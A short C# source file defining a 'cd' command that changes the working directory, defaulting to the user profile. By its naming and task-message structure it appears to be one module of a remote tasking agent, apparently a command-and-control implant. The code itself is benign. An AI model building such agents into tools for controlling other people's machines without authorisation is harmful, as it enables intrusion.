using Knight.Models.Raven;
using System;
using System.IO;

namespace Knight.Commands
{
    public class ChangeDirectory : KnightCommand
    {
        public override string Name => "cd";

        public override string Execute(TaskMessage task)
        {
            string path;

            //if (task.Arguments is null || task.Arguments.Length == 0)
            if (task.Arguments is null || task.Arguments[0] == "") // args are required
            {
                path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            }
            else
            {
                path = task.Arguments[0];
            }

            Directory.SetCurrentDirectory(path);

            return Directory.GetCurrentDirectory();
        }
    }
}